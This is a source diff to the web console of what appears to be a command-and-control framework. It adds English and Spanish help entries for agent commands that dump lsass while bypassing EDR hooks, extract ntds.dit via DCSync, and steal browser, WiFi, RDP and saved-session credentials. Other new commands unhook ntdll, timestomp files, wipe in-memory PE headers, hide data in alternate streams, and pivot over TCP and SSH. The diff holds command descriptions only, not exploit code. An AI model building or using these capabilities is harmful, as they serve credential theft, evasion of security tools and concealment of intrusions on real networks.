@@ -4627,6 +4627,7 @@ function agentContextMenu(e, agentId) {
     {_header: a.hostname + ' · ' + a.username + (a.ip ? ' · ' + a.ip : '')},
     {label:'📟  Open Console',       action:{fn:'openConsoleFor',   id}},
     {label:'🤖  Open AI Console',    action:{fn:'openAIConsole',    id}},
+    null,
     {_sub:'🔎  Recon', items:[
       {label:'📂  File Explorer',      action:{fn:'openFileExplorer', id}},
       null,
@@ -8179,6 +8180,7 @@ function getHelpHTML_en(isWin) {
   getpid                             agent process PID
   ppid                               agent parent process PPID
   port-scan &lt;target&gt; &lt;ports&gt; [ms]   TCP scan from agent (timeout per port in ms)
+  search &lt;pattern&gt; [path]            recursive file search on target (wildcards: *.kdbx *.pfx)
 ${isWin ? `
 <span class="console-section">COLLECTION</span>
   screenshot                         screenshot → server
@@ -8187,7 +8189,14 @@ ${isWin ? `
   clip                               read clipboard (one-shot)
   clip-monitor start / dump / stop   monitor clipboard continuously
   minidump [pid]                     dump process to .dmp and download; no pid → lsass.exe
+  lsass-dump-nt [pid]                dump lsass via NtReadVirtualMemory (bypasses EDR hooks)
   ntds-dump [outdir]                 dump ntds.dit via ntdsutil (requires DA)
+  dcsync [ifm|vss] [out=&lt;path&gt;]     extract ntds.dit+SYSTEM hive and upload (offline secretsdump)
+  browser-creds                      steal saved credentials from Chrome/Edge/Brave
+  gpp-passwords                      find GPP passwords in SYSVOL shares (MS14-025)
+  wifi-creds                         dump saved WiFi profile passwords
+  session-creds                      steal creds from PuTTY/WinSCP/FileZilla/RDP saved sessions
+  gpp-hunt                           hunt GPP passwords across all domain SYSVOL shares
 
 <span class="console-section">INJECTION / EXECUTION</span>
   inject &lt;pid&gt; &lt;sc.bin&gt;             classic injection: WriteProcessMemory + CreateRemoteThread
@@ -8220,6 +8229,7 @@ ${isWin ? `
   hwbp-clear                         clear active hardware breakpoints (zero DR0–DR3)
   mem-fluctuate start [secs]|stop    periodically XOR-mutate agent's internal in-memory buffers
   encode-uuid &lt;sc.bin&gt;              encode shellcode as UUIDs; outputs C code using UuidFromStringA
+  ntdll-unhook                       restore ntdll from clean on-disk copy (remove inline EDR hooks)
 
 <span class="console-section">TOKENS / PRIVESC</span>
   token whoami                       show current process token
@@ -8261,6 +8271,20 @@ ${isWin ? `
   ishell cmd                         open persistent interactive cmd.exe
   ishell ps                          open interactive PowerShell
   ishell exit                        close interactive shell
+
+<span class="console-section">ANTI-FORENSICS</span>
+  timestomp &lt;file&gt; [date|ref]        overwrite MACB timestamps (ref = source file path or YYYY-MM-DD)
+  wipe-mz                            zero MZ/PE header of agent in memory (hides from memory scans)
+  ads list &lt;file&gt;                    list NTFS alternate data streams on a file
+  ads read &lt;file&gt;:&lt;stream&gt;          read ADS stream content
+  ads write &lt;file&gt;:&lt;stream&gt; &lt;data&gt;  write data to ADS stream (hidden storage)
+  ads del &lt;file&gt;:&lt;stream&gt;           delete ADS stream
+
+<span class="console-section">REGISTRY</span>
+  reg query  &lt;HIVE\Path&gt; [ValueName] read a value (or list all values in key)
+  reg set    &lt;HIVE\Path&gt; &lt;Name&gt; &lt;V&gt;  write REG_SZ value
+  reg delete &lt;HIVE\Path&gt; [ValueName] delete a value or entire key
+  reg list   &lt;HIVE\Path&gt;             enumerate sub-keys
 ` : ''}
 <span class="console-section">PIVOT / TUNNEL</span>
   socks &lt;port&gt; [user:pass]          SOCKS5 proxy on agent (Go agent)
@@ -8272,6 +8296,9 @@ ${isWin ? `
   portfwd add [tcp|udp] &lt;lport&gt; &lt;rhost&gt; &lt;rport&gt;  agent port forward: local port → remote host:port
   portfwd del [tcp|udp] &lt;lport&gt; / portfwd list
   httpivot start [port] / httpivot stop  HTTP proxy server on agent for proxychains
+  tcppivot start &lt;port&gt;             TCP pivot server on agent — child agents connect via tcp:// transport
+  tcppivot stop [port]               stop TCP pivot (no port = stop all)
+  ssh-exec &lt;host&gt; [port] &lt;user&gt; &lt;pass&gt; &lt;cmd&gt;  run command on remote host via SSH (password auth)
 ${isWin ? `  link start [pipename] / link stop        connect to child agent via SMB named pipe (P2P)` : ''}`;
 }
 
@@ -8315,6 +8342,7 @@ function getHelpHTML_es(isWin) {
   getpid                             PID del proceso agente
   ppid                               PPID del proceso padre del agente
   port-scan &lt;target&gt; &lt;puertos&gt; [ms]  TCP scan desde el agente (timeout por puerto en ms)
+  search &lt;patrón&gt; [ruta]             búsqueda recursiva de archivos en el objetivo (wildcards: *.kdbx *.pfx)
 ${isWin ? `
 <span class="console-section">COLECCIÓN</span>
   screenshot                         captura de pantalla → servidor
@@ -8323,7 +8351,14 @@ ${isWin ? `
   clip                               leer portapapeles (una vez)
   clip-monitor start / dump / stop   monitorizar portapapeles continuamente
   minidump [pid]                     volcar proceso a .dmp y descargarlo; sin pid → lsass.exe
+  lsass-dump-nt [pid]                volcar lsass vía NtReadVirtualMemory (bypasa hooks EDR)
   ntds-dump [outdir]                 volcar ntds.dit vía ntdsutil (requiere DA)
+  dcsync [ifm|vss] [out=&lt;ruta&gt;]     extraer ntds.dit+SYSTEM hive y subir al C2 (secretsdump offline)
+  browser-creds                      robar credenciales guardadas de Chrome/Edge/Brave
+  gpp-passwords                      buscar contraseñas GPP en shares SYSVOL (MS14-025)
+  wifi-creds                         volcar contraseñas de perfiles WiFi guardados
+  session-creds                      robar credenciales de PuTTY/WinSCP/FileZilla/RDP
+  gpp-hunt                           buscar contraseñas GPP en todos los shares SYSVOL del dominio
 
 <span class="console-section">INYECCIÓN / EJECUCIÓN</span>
   inject &lt;pid&gt; &lt;sc.bin&gt;             inyección clásica: WriteProcessMemory + CreateRemoteThread
@@ -8356,6 +8391,7 @@ ${isWin ? `
   hwbp-clear                         eliminar hardware breakpoints activos (escribir 0 en DR0–DR3)
   mem-fluctuate start [secs]|stop    XOR-muta periódicamente los buffers internos del agente en memoria
   encode-uuid &lt;sc.bin&gt;              codifica shellcode como UUIDs; genera código C con UuidFromStringA
+  ntdll-unhook                       restaurar ntdll desde copia limpia en disco (elimina hooks inline del EDR)
 
 <span class="console-section">TOKENS / PRIVESC</span>
   token whoami                       mostrar token actual del proceso
@@ -8392,6 +8428,20 @@ ${isWin ? `
   ishell cmd                         abrir cmd.exe interactivo persistente
   ishell ps                          abrir PowerShell interactivo
   ishell exit                        cerrar shell interactiva
+
+<span class="console-section">ANTI-FORENSICS</span>
+  timestomp &lt;archivo&gt; [fecha|ref]    sobreescribir timestamps MACB (ref = ruta a copiar o YYYY-MM-DD)
+  wipe-mz                            borrar cabecera MZ/PE del agente en memoria (anti-escaneo)
+  ads list &lt;archivo&gt;                 listar streams ADS (Alternate Data Streams NTFS) del archivo
+  ads read &lt;archivo&gt;:&lt;stream&gt;       leer contenido de stream ADS
+  ads write &lt;archivo&gt;:&lt;stream&gt; &lt;d&gt;  escribir datos en stream ADS (almacenamiento oculto)
+  ads del &lt;archivo&gt;:&lt;stream&gt;        eliminar stream ADS
+
+<span class="console-section">REGISTRO</span>
+  reg query  &lt;HIVE\Ruta&gt; [Nombre]   leer un valor (o listar todos los valores de la clave)
+  reg set    &lt;HIVE\Ruta&gt; &lt;N&gt; &lt;V&gt;    escribir valor REG_SZ
+  reg delete &lt;HIVE\Ruta&gt; [Nombre]   borrar valor o clave entera
+  reg list   &lt;HIVE\Ruta&gt;            listar subclaves
 ` : ''}
 <span class="console-section">PIVOT / TUNNEL</span>
   socks &lt;port&gt; [user:pass]          SOCKS5 proxy en el agente (Go agent)
@@ -8403,6 +8453,9 @@ ${isWin ? `
   portfwd add [tcp|udp] &lt;lport&gt; &lt;rhost&gt; &lt;rport&gt;  reenvío de puerto del agente a host:puerto remoto
   portfwd del [tcp|udp] &lt;lport&gt; / portfwd list
   httpivot start [port] / httpivot stop  servidor HTTP en el agente para proxychains
+  tcppivot start &lt;port&gt;             servidor TCP en el agente — agentes hijo conectan vía tcp:// transport
+  tcppivot stop [port]               detener pivot TCP (sin puerto = detener todos)
+  ssh-exec &lt;host&gt; [port] &lt;u&gt; &lt;p&gt; &lt;cmd&gt;  ejecutar comando en host remoto vía SSH (autenticación password)
 ${isWin ? `  link start [pipename] / link stop        conectar a agente hijo vía named pipe SMB (P2P)` : ''}`;
 }
 
